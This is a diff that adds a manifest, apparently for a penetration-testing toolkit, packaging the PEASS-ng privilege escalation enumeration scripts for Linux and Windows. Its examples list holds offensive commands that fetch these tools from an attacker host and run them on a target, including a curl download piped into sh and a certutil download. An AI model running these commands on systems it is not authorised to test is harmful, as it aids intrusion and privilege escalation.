@@ -1,0 +1,32 @@
+schema = 1
+kind = "upload"
+description = "Privilege escalation enumeration scripts for Linux and Windows"
+tags = ["privesc", "enum", "linux", "windows"]
+upstream = "https://github.com/peass-ng/PEASS-ng"
+licence = "GPL-2.0-or-later with additional terms"
+arch = "x86_64"
+examples = [
+  "python3 -m http.server 80",
+  "curl http://{lhost}/linpeas.sh | sh",
+  "certutil -urlcache -f http://{lhost}/winPEASx64.exe winPEASx64.exe",
+]
+
+[[upload]]
+path = "files/linpeas.sh"
+as = "linpeas.sh"
+note = "Linux"
+
+[[upload]]
+path = "files/winPEASx64.exe"
+as = "winPEASx64.exe"
+note = "Windows x64, .NET"
+
+[[upload]]
+path = "files/winPEASany.exe"
+as = "winPEASany.exe"
+note = "Windows, any architecture, .NET"
+
+[[upload]]
+path = "files/winPEAS.bat"
+as = "winPEAS.bat"
+note = "Windows, batch file"
